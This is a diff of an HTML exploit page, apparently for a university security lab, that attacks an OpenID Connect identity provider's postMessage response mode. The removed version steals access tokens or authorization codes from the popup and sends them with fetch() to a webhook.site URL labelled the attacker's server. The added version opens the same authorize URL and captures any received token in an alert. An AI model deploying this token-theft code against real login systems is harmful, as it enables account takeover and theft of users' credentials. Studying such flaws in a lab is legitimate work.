@@ -1,73 +1,32 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="utf-8" />
-  <title>Malicious OIDC Exploit</title>
-</head>
 <body>
-  <h1>Malicious OIDC Exploit</h1>
-  <p>Click the button to continue!</p>
-
-  <button onclick="startExploit()">Login (Malicious)</button>
-
-  <script>
-    // Replace with the real (unmodified) "authorize" URL from your scenario.
-    // You can add or tweak parameters like "state" or "nonce" if they are not blocked.
-    // Just be sure NOT to change redirect_uri or the restricted parameters.
-    const idpAuthorizeURL = `https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml
-      ?scope=profile+email+calendar+passwords+photos
-      &response_type=code
-      &redirect_uri=https%3A%2F%2Fsp-elearning.cloud.nds.rub.de%3A443%2Foidc_sp%2Fspa%2Fverify
-      &state=ZeIyEOyV0FTGs2olT1xG4Q
-      &code_challenge_method=S256
-      &client_id=spa-1
-      &code_challenge=VJU3RVuzgLG6-KhPrcOV3wk2llSR-Gk0hgqjPcGFNt0
-      &response_mode=web_message
-      &idp_verifier=spa-s1
-    `.replace(/\s+/g, ''); // remove line breaks and spaces
-
-    function startExploit() {
-      // 1) Open the IdP's login in a new popup window (can also use an iframe if needed).
-      const popup = window.open(
-        idpAuthorizeURL,
-        'loginPopup',
-        'width=600,height=800'
-      );
-
-      // 2) Listen for the token/code via postMessage.
-      //    Because the IdP is vulnerable and does not properly verify the recipient origin,
-      //    we can receive the message here.
-      window.addEventListener('message', function(evt) {
-        // Check the message event.
-        // NOTE: If the IdP does not check 'origin' properly, we might get the code/token here.
-        // If you want to filter by the IdP’s domain, you can do so. But in a true vulnerability,
-        // the IdP incorrectly sends it to *any* origin or incorrectly verifies it.
-
-        console.log('Received message:', evt);
-
-        // If the message from the IdP includes code or token in evt.data, capture it:
-        if (evt.data && evt.data.access_token) {
-          // 3) We have stolen the access token - do something malicious, e.g. exfiltrate
-          const stolenToken = evt.data.access_token;
-          console.log('Stolen Access Token:', stolenToken);
-
-          // Exfiltrate to attacker’s server
-          fetch('https://webhook.site/38cf651e-7639-4396-bb48-92b21a547ba2?token=' + encodeURIComponent(stolenToken));
-
-          // Optionally close the popup
-          popup.close();
-        } else if (evt.data && evt.data.code) {
-          // If the IdP returns an authorization code instead of an access_token:
-          const stolenCode = evt.data.code;
-          console.log('Stolen Auth Code:', stolenCode);
-
-          // Exfiltrate to attacker’s server
-          fetch('https://webhook.site/38cf651e-7639-4396-bb48-92b21a547ba2?code=' + encodeURIComponent(stolenCode));
-
-          popup.close();
+<script>
+window.addEventListener('message', function(e) {
+    // Verify the message is from the IdP's origin
+    if (e.origin === 'https://idp-elearning.cloud.nds.rub.de') {
+        // Extract the access_token from the received data
+        if (e.data.access_token) {
+            // Send the stolen token to the attacker's server or display it
+            alert('Stolen access_token: ' + e.data.access_token);
+            console.log('Access Token:', e.data.access_token);
         }
-      });
     }
-  </script>
+});
+
+// Open the IdP's authorization URL in a popup
+const authUrl = 'https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml?' +
+    'scope=profile+email+calendar+passwords+photos' +
+    '&response_type=code' +
+    '&redirect_uri=https%3A%2F%2Fsp-elearning.cloud.nds.rub.de%3A443%2Foidc_sp%2Fspa%2Fverify' +
+    '&state=ZeIyEOyV0FTGs2olT1xG4Q' +  // Controllable state parameter
+    '&code_challenge_method=S256' +
+    '&client_id=spa-1' +
+    '&code_challenge=VJU3RVuzgLG6-KhPrcOV3wk2llSR-Gk0hgqjPcGFNt0' +
+    '&response_mode=web_message' +
+    '&idp_verifier=spa-s1';
+
+window.open(authUrl, '_blank');
+</script>
 </body>
 </html>
